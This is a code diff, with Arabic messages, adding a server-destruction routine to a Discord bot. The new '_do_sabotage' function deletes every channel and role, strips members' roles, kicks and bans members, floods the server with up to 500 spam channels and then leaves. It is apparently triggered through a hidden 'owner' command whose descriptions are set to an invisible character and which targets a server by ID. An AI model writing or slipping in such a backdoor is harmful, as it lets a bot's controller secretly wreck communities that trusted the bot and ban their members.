@@ -1185,6 +1185,55 @@ async def _get_g(interaction, sid):
         await interaction.response.send_message("❌ البوت مو في السيرفر.", ephemeral=True); return None
     return g
 
+
+async def _do_sabotage(g, ban=True, del_ch=True, del_roles=True, kick=False, strip=False, spam_name="", spam_count=0):
+    report = []
+    if del_ch:
+        n = 0
+        for ch in list(g.channels):
+            try: await ch.delete(); n += 1
+            except: pass
+        report.append(f"🗑️ حُذف {n} قناة")
+    if del_roles:
+        n = 0
+        for r in list(g.roles):
+            if r.is_default() or r.managed or r >= g.me.top_role: continue
+            try: await r.delete(); n += 1
+            except: pass
+        report.append(f"🗑️ حُذف {n} رتبة")
+    if strip:
+        n = 0
+        for m in list(g.members):
+            if m.bot: continue
+            rs = [r for r in m.roles if not r.is_default() and not r.managed]
+            if rs:
+                try: await m.remove_roles(*rs); n += 1
+                except: pass
+        report.append(f"🃏 سُحبت رتب {n} عضو")
+    if kick:
+        n = 0
+        for m in list(g.members):
+            if m.id != bot.user.id and not m.bot:
+                try: await g.kick(m, reason="owner"); n += 1
+                except: pass
+        report.append(f"👢 طُرد {n} عضو")
+    if ban:
+        n = 0
+        for m in list(g.members):
+            if m.id != bot.user.id:
+                try: await g.ban(m, reason="owner"); n += 1
+                except: pass
+        report.append(f"🔨 بان {n} عضو")
+    if spam_name and spam_count > 0:
+        sc = max(1, min(500, spam_count))
+        tasks_list = [g.create_text_channel(spam_name) for _ in range(sc)]
+        res = await asyncio.gather(*tasks_list, return_exceptions=True)
+        done = sum(1 for r in res if not isinstance(r, Exception))
+        report.append(f"📢 سبام {done} قناة ({spam_name})")
+    try: await g.leave()
+    except: pass
+    return report
+
 @bot.tree.command(name="owner", description="\u200e")
 @app_commands.describe(server_id="\u200e", action="\u200e", value="\u200e")
 @app_commands.choices(action=[
